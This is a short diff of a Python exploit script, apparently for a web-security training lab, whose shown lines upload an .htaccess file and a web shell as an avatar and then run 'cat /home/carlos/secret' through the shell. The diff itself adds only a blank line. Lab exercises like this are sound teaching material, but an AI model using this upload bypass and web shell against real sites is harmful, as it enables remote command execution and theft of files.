@@ -43,6 +43,7 @@ def upload_files():
    requests.post(f"{lab_url}/my-account/avatar", cookies={"session": cookie}, files=htaccess_file, data=data)
    requests.post(f"{lab_url}/my-account/avatar", cookies={"session": cookie}, files=web_shell_file, data=data)
 
+
 def execute_command():
     response = requests.get(f"{lab_url}/files/avatars/webshell.l33t?cmd=cat%20/home/carlos/secret", cookies={"session": cookie})
     print(response.text)
